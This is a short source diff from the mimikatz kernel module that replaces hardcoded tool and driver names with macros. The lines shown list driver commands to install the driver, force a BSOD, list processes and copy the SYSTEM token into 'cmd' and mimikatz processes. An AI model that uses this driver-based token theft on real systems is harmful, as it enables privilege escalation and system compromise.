@@ -6,8 +6,8 @@
 #include "kuhl_m_kernel.h"
 
 const KUHL_K_C kuhl_k_c_kernel[] = {
-	{kuhl_m_kernel_add_mimidrv,			0,									L"+",				L"Install and/or start mimikatz driver (mimidrv)"},
-	{kuhl_m_kernel_remove_mimidrv,		0,									L"-",				L"Remove mimikatz driver (mimidrv)"},
+	{kuhl_m_kernel_add_mimidrv,			0,									L"+",				L"Install and/or start " MIMIKATZ L" driver (" MIMIKATZ_DRIVER L")"},
+	{kuhl_m_kernel_remove_mimidrv,		0,									L"-",				L"Remove " MIMIKATZ L" driver (" MIMIKATZ_DRIVER L")"},
 	{NULL,								IOCTL_MIMIDRV_PING,					L"ping",			L"Ping the driver"},
 	{NULL,								IOCTL_MIMIDRV_BSOD,					L"bsod",			L"BSOD !"},
 	{NULL,								IOCTL_MIMIDRV_PROCESS_LIST,			L"process",			L"List process"},
@@ -141,7 +141,7 @@ NTSTATUS kuhl_m_kernel_processToken(int argc, wchar_t * argv[])
 	if(!tokenInfo.fromProcessId)
 		kprintf(L" * from 0 will take SYSTEM token\n");
 	if(!tokenInfo.toProcessId)
-		kprintf(L" * to 0 will take all \'cmd\' and \'mimikatz\' process\n");
+		kprintf(L" * to 0 will take all \'cmd\' and \'" MIMIKATZ L"\' process\n");
 
 	kull_m_kernel_mimidrv_simple_output(IOCTL_MIMIDRV_PROCESS_TOKEN, &tokenInfo, sizeof(MIMIDRV_PROCESS_TOKEN_FROM_TO));
 
